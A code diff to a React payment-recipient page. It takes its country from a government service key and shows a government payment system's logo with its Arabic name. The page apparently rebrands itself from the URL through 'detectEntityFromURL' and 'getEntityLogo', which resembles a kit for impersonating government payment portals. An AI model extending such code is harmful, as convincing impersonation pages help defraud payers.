@@ -19,7 +19,7 @@ import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { isGovernmentService, getGovernmentServicesByCountry } from "@/lib/governmentPaymentServices";
+import { isGovernmentService, getGovernmentServicesByCountry, getCountryFromServiceKey } from "@/lib/governmentPaymentServices";
 
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
@@ -76,12 +76,14 @@ const PaymentRecipient = () => {
   const currencyCode = currencyParam || shippingInfo?.currency_code || "SAR";
   const inferredCountryFromCurrency = getCountryByCurrency(currencyCode);
   
-  const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
-  const countryData = getCountryByCode(countryCode);
-  const phoneCode = countryData?.phoneCode || "+966";
-  
   // Check if this is a government service and get its theme
   const isGovService = isGovernmentService(serviceKey);
+  
+  // For government services, get the correct country from service key
+  const serviceCountry = isGovService ? getCountryFromServiceKey(serviceKey) : null;
+  const countryCode = serviceCountry || countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
+  const countryData = getCountryByCode(countryCode);
+  const phoneCode = countryData?.phoneCode || "+966";
   const govSystem = getGovernmentPaymentSystem(countryCode);
   
   // Get government services for the specific country
@@ -248,11 +250,13 @@ const PaymentRecipient = () => {
           <div className="flex items-center justify-between h-12 sm:h-14">
             <div className="flex items-center gap-2 sm:gap-3">
               {isGovService && govSystem.logo ? (
-                <img 
-                  src={govSystem.logo} 
-                  alt={serviceName}
-                  className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
-                />
+                <div className="bg-white/95 px-2 py-1 rounded-lg">
+                  <img 
+                    src={govSystem.logo} 
+                    alt={govSystem.nameAr}
+                    className="h-7 sm:h-9 w-auto object-contain"
+                  />
+                </div>
               ) : displayLogo && (
                 <img 
                   src={displayLogo} 
